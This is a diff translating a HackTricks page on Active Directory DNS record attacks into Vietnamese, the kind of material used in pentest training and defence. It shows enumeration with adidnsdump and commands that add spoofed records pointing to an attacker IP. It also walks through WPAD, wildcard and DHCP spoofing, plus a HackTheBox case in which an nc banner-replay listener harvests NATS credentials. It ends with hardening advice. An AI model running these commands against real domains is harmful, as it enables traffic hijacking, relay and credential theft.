@@ -1,10 +1,10 @@
-# AD DNS Records
+# Bản ghi DNS AD
 
 {{#include ../../banners/hacktricks-training.md}}
 
-By default **any user** in Active Directory can **enumerate all DNS records** in the Domain or Forest DNS zones, similar to a zone transfer (users can list the child objects of a DNS zone in an AD environment).
+Theo mặc định, **bất kỳ người dùng nào** trong Active Directory cũng có thể **liệt kê tất cả bản ghi DNS** trong các vùng DNS của Domain hoặc Forest, tương tự như zone transfer (người dùng có thể liệt kê các đối tượng con của một vùng DNS trong môi trường AD).
 
-The tool [**adidnsdump**](https://github.com/dirkjanm/adidnsdump) enables **enumeration** and **exporting** of **all DNS records** in the zone for recon purposes of internal networks.<sup>[[4]](#references)</sup>
+Công cụ [**adidnsdump**](https://github.com/dirkjanm/adidnsdump) cho phép **liệt kê** và **xuất** **tất cả bản ghi DNS** trong vùng nhằm phục vụ công tác trinh sát mạng nội bộ.<sup>[[4]](#references)</sup>
 
 ```bash
 git clone https://github.com/dirkjanm/adidnsdump
@@ -23,15 +23,15 @@ adidnsdump -u domain_name\\username ldap://10.10.10.10 --zone _msdcs.domain.loca
 cat records.csv
 ```
 
->  adidnsdump v1.4.0 (April 2025) adds JSON/Greppable (`--json`) output, multi-threaded DNS resolution and support for TLS 1.2/1.3 when binding to LDAPS  
+> adidnsdump v1.4.0 (tháng 4 năm 2025) bổ sung đầu ra JSON/Greppable (`--json`), phân giải DNS đa luồng và hỗ trợ TLS 1.2/1.3 khi kết nối với LDAPS  
 
-For more information read [https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/](https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/)<sup>[[4]](#references)</sup>
+Để biết thêm thông tin, hãy đọc [https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/](https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/)<sup>[[4]](#references)</sup>
 
 ---
 
-## Creating / Modifying records (ADIDNS spoofing)
+## Tạo / Sửa đổi bản ghi (ADIDNS spoofing)
 
-Because the **Authenticated Users** group has **Create Child** on the zone DACL by default, any domain account (or computer account) can register additional records.  This can be used for traffic hijacking, NTLM relay coercion or even full domain compromise.
+Vì nhóm **Authenticated Users** mặc định có quyền **Create Child** trên DACL của zone, mọi tài khoản domain (hoặc tài khoản máy tính) đều có thể đăng ký thêm bản ghi. Điều này có thể được dùng để chiếm quyền điều hướng lưu lượng, ép buộc NTLM relay hoặc thậm chí chiếm toàn bộ domain.
 
 ### PowerMad / Invoke-DNSUpdate (PowerShell)
 
@@ -52,7 +52,7 @@ Invoke-DNSUpdate -DNSType A -DNSName evil -DNSData 10.10.14.37 -Delete -Verbose
 python3 dnsupdate.py -u 'DOMAIN/user:Passw0rd!' -dc-ip 10.10.10.10 -action add -record evil.domain.local -type A -data 10.10.14.37
 ```
 
-*(dnsupdate.py ships with Impacket ≥0.12.0)*
+*(dnsupdate.py đi kèm Impacket ≥0.12.0)*
 
 ### BloodyAD
 
@@ -62,29 +62,29 @@ bloodyAD -u DOMAIN\\user -p 'Passw0rd!' --host 10.10.10.10 dns add A evil 10.10.
 
 ---
 
-## Common attack primitives
+## Các primitive tấn công phổ biến
 
-1. **Wildcard record** – `*.<zone>` turns the AD DNS server into an enterprise-wide responder similar to LLMNR/NBNS spoofing. It can be abused to capture NTLM hashes or to relay them to LDAP/SMB.  (Requires WINS-lookup to be disabled.)<sup>[[1]](#references)</sup>    
-2. **WPAD hijack** – add `wpad` (or an **NS** record pointing to an attacker host to bypass the Global-Query-Block-List) and transparently proxy outbound HTTP requests to harvest credentials.  Microsoft patched the wildcard/ DNAME bypasses (CVE-2018-8320) but **NS-records still work**.<sup>[[1]](#references)</sup>    
-3. **Stale entry takeover** – claim the IP address that previously belonged to a workstation and the associated DNS entry will still resolve, enabling resource-based constrained delegation or Shadow-Credentials attacks without touching DNS at all.    
-4. **DHCP → DNS spoofing** – on a default Windows DHCP+DNS deployment an unauthenticated attacker on the same subnet can overwrite any existing A record (including Domain Controllers) by sending forged DHCP requests that trigger dynamic DNS updates (Akamai “DDSpoof”, 2023).  This gives machine-in-the-middle over Kerberos/LDAP and can lead to full domain takeover.<sup>[[2]](#references)</sup>    
-5. **Certifried (CVE-2022-26923)** – change the `dNSHostName` of a machine account you control, register a matching A record, then request a certificate for that name to impersonate the DC. Tools such as **Certipy** or **BloodyAD** fully automate the flow.  
+1. **Wildcard record** – `*.<zone>` biến máy chủ AD DNS thành một responder trên toàn doanh nghiệp, tương tự như giả mạo LLMNR/NBNS. Kỹ thuật này có thể bị lạm dụng để thu thập NTLM hash hoặc relay chúng đến LDAP/SMB. (Yêu cầu tắt WINS-lookup.)<sup>[[1]](#references)</sup>    
+2. **WPAD hijack** – thêm `wpad` (hoặc một record **NS** trỏ đến máy chủ của attacker để bỏ qua Global-Query-Block-List), rồi proxy minh bạch các HTTP request gửi ra ngoài để thu thập thông tin xác thực. Microsoft đã vá các cách bypass wildcard/DNAME (CVE-2018-8320), nhưng **NS-record vẫn hoạt động**.<sup>[[1]](#references)</sup>    
+3. **Chiếm quyền stale entry** – chiếm địa chỉ IP trước đây thuộc về một workstation; entry DNS tương ứng vẫn phân giải được, cho phép thực hiện resource-based constrained delegation hoặc các cuộc tấn công Shadow-Credentials mà không cần động đến DNS.    
+4. **Giả mạo DHCP → DNS** – trong triển khai Windows DHCP+DNS mặc định, attacker không xác thực trên cùng subnet có thể ghi đè bất kỳ A record hiện có nào (kể cả Domain Controller) bằng cách gửi các DHCP request giả mạo kích hoạt dynamic DNS update (Akamai “DDSpoof”, 2023). Điều này cho phép thực hiện machine-in-the-middle qua Kerberos/LDAP và có thể dẫn đến chiếm quyền toàn bộ domain.<sup>[[2]](#references)</sup>    
+5. **Certifried (CVE-2022-26923)** – thay đổi `dNSHostName` của một machine account do bạn kiểm soát, đăng ký một A record khớp với tên đó, sau đó yêu cầu certificate cho tên đó để giả mạo DC. Các công cụ như **Certipy** hoặc **BloodyAD** tự động hóa toàn bộ quy trình.  
 
-An AD DNS record with [serialized target information](../ntlm/README.md#ntlm--kerberos-reflection-via-serialized-spns-cve-2025-33073) can form part of a conditional relay chain: the caller needs record-creation rights, a coercion path that causes the target computer to authenticate to that name, and a relay destination that accepts the resulting authentication. Assess the destination protocol separately; SMB signing on the incoming connection does not by itself establish whether an HTTPS WinRM destination accepts the relay. Patch level, name handling, Extended Protection and service configuration can change the outcome.
+Một AD DNS record chứa [serialized target information](../ntlm/README.md#ntlm--kerberos-reflection-via-serialized-spns-cve-2025-33073) có thể là một phần của chuỗi relay có điều kiện: bên gọi cần có quyền tạo record, một đường coercion khiến máy tính mục tiêu xác thực đến tên đó, và một đích relay chấp nhận kết quả xác thực. Hãy đánh giá riêng giao thức ở đích; SMB signing trên kết nối đi vào tự nó không xác định được liệu đích HTTPS WinRM có chấp nhận relay hay không. Mức độ vá lỗi, cách xử lý tên, Extended Protection và cấu hình dịch vụ có thể làm thay đổi kết quả.
 
 ---
 
-### Internal service hijacking via stale dynamic records (NATS case study)
+### Chiếm quyền dịch vụ nội bộ qua dynamic record cũ (nghiên cứu tình huống NATS)
 
-When dynamic updates stay open to all authenticated users, **a de-registered service name can be re-claimed and pointed to attacker infrastructure**. The Mirage HTB DC exposed the hostname `nats-svc.mirage.htb` after DNS scavenging, so any low-privileged user could:<sup>[[3]](#references)</sup>
+Khi dynamic update vẫn được mở cho tất cả người dùng đã xác thực, **một tên dịch vụ đã bị hủy đăng ký có thể bị chiếm lại và trỏ đến hạ tầng của attacker**. DC Mirage HTB để lộ hostname `nats-svc.mirage.htb` sau khi DNS scavenging diễn ra, nên bất kỳ người dùng nào có quyền thấp cũng có thể:<sup>[[3]](#references)</sup>
 
-1. **Confirm the record is missing** and learn the SOA with `dig`:
+1. **Xác nhận record đã bị thiếu** và tìm hiểu SOA bằng `dig`:
 
 ```bash
 dig @dc01.mirage.htb nats-svc.mirage.htb
 ```
 
-2. **Re-create the record** toward an external/VPN interface they control:
+2. **Tạo lại bản ghi** trỏ đến một giao diện external/VPN mà họ kiểm soát:
 
 ```bash
 nsupdate
@@ -93,34 +93,33 @@ nsupdate
 > send
 ```
 
-3. **Impersonate the plaintext service**. NATS clients expect to see one `INFO { ... }` banner before they send credentials, so copying a legitimate banner from the real broker is enough to harvest secrets:
+3. **Giả mạo dịch vụ plaintext**. Các client NATS mong đợi nhận được một banner `INFO { ... }` trước khi gửi thông tin xác thực, vì vậy chỉ cần sao chép banner hợp lệ từ broker thật là đủ để thu thập bí mật:
 
 ```bash
 # Capture a single INFO line from the real service and replay it to victims
 nc 10.10.11.78 4222 | head -1 | nc -lnvp 4222
 ```
 
-Any client that resolves the hijacked name will immediately leak its JSON `CONNECT` frame (including `"user"`/`"pass"`) to the listener. Running the official `nats-server -V` binary on the attacker host, disabling its log redaction, or just sniffing the session with Wireshark yields the same plaintext credentials because TLS was optional.
+Bất kỳ client nào phân giải tên đã bị chiếm quyền sẽ ngay lập tức leak frame JSON `CONNECT` của nó (bao gồm `"user"`/`"pass"`) đến listener. Chạy binary `nats-server -V` chính thức trên host của attacker, tắt tính năng che giấu log hoặc chỉ cần sniff phiên bằng Wireshark đều cho ra cùng thông tin xác thực dạng plaintext vì TLS là tùy chọn.
 
-4. **Pivot with the captured creds** – in Mirage the stolen NATS account provided JetStream access, which exposed historic authentication events containing reusable AD usernames/passwords.
+4. **Pivot với creds đã thu thập** – trong Mirage, tài khoản NATS bị đánh cắp cung cấp quyền truy cập JetStream, qua đó làm lộ các sự kiện xác thực trước đây chứa tên người dùng/mật khẩu AD có thể tái sử dụng.
 
-This pattern applies to every AD-integrated service that relies on unsecured TCP handshakes (HTTP APIs, RPC, MQTT, etc.): once the DNS record is hijacked, the attacker becomes the service.
+Mô hình này áp dụng cho mọi dịch vụ tích hợp AD dựa vào quá trình bắt tay TCP không bảo mật (HTTP API, RPC, MQTT, v.v.): khi bản ghi DNS bị chiếm quyền, attacker trở thành dịch vụ.
 
 ---
 
-## Detection & hardening
+## Phát hiện & tăng cường bảo mật
 
-* Deny **Authenticated Users** the *Create all child objects* right on sensitive zones and delegate dynamic updates to a dedicated account used by DHCP.
-* If dynamic updates are required, set the zone to **Secure-only** and enable **Name Protection** in DHCP so that only the owner computer object can overwrite its own record.
-* Monitor DNS Server event IDs 257/252 (dynamic update), 770 (zone transfer) and LDAP writes to `CN=MicrosoftDNS,DC=DomainDnsZones`.
-* Block dangerous names (`wpad`, `isatap`, `*`) with an intentionally-benign record or via the Global Query Block List.
-* Keep DNS servers patched – e.g., RCE bugs CVE-2024-26224 and CVE-2024-26231 reached **CVSS 9.8** and are remotely exploitable against Domain Controllers.  
+* Từ chối quyền *Create all child objects* của **Authenticated Users** trên các zone nhạy cảm và ủy quyền cập nhật động cho một tài khoản chuyên dụng được DHCP sử dụng.
+* Nếu cần cập nhật động, hãy đặt zone thành **Secure-only** và bật **Name Protection** trong DHCP để chỉ computer object sở hữu bản ghi mới có thể ghi đè bản ghi đó.
+* Giám sát các event ID 257/252 của DNS Server (cập nhật động), 770 (chuyển zone) và các lần ghi LDAP vào `CN=MicrosoftDNS,DC=DomainDnsZones`.
+* Chặn các tên nguy hiểm (`wpad`, `isatap`, `*`) bằng một bản ghi cố ý vô hại hoặc thông qua Global Query Block List.
+* Luôn cập nhật bản vá cho DNS server – ví dụ: các lỗi RCE CVE-2024-26224 và CVE-2024-26231 đạt **CVSS 9.8** và có thể bị khai thác từ xa nhằm vào Domain Controller.  
 
 ## References
 
-- [1] [ADIDNS Revisited - WPAD, GQBL, and More](https://www.netspi.com/blog/technical-blog/network-pentesting/adidns-revisited/) (2018, still the de-facto reference for wildcard/WPAD attacks)
-- [2] [Spoofing DNS Records by Abusing DHCP DNS Dynamic Updates](https://www.akamai.com/blog/security-research/spoofing-dns-by-abusing-dhcp) (Dec 2023)
-- [3] [HackTheBox Mirage: Chaining NFS Leaks, Dynamic DNS Abuse, NATS Credential Theft, JetStream Secrets, and Kerberoasting](https://0xdf.gitlab.io/2025/11/22/htb-mirage.html)
-- [4] [Getting in the Zone: dumping Active Directory DNS using adidnsdump](https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/)
-
+- [1] [ADIDNS xem xét lại - WPAD, GQBL và nhiều nội dung khác](https://www.netspi.com/blog/technical-blog/network-pentesting/adidns-revisited/) (2018, still the de-facto reference for wildcard/WPAD attacks)
+- [2] [Giả mạo bản ghi DNS bằng cách lạm dụng cập nhật DNS động của DHCP](https://www.akamai.com/blog/security-research/spoofing-dns-by-abusing-dhcp) (Dec 2023)
+- [3] [HackTheBox Mirage: Kết hợp rò rỉ NFS, lạm dụng Dynamic DNS, đánh cắp thông tin xác thực NATS, bí mật JetStream và Kerberoasting](https://0xdf.gitlab.io/2025/11/22/htb-mirage.html)
+- [4] [Vào zone: kết xuất DNS của Active Directory bằng adidnsdump](https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/)
 {{#include ../../banners/hacktricks-training.md}}
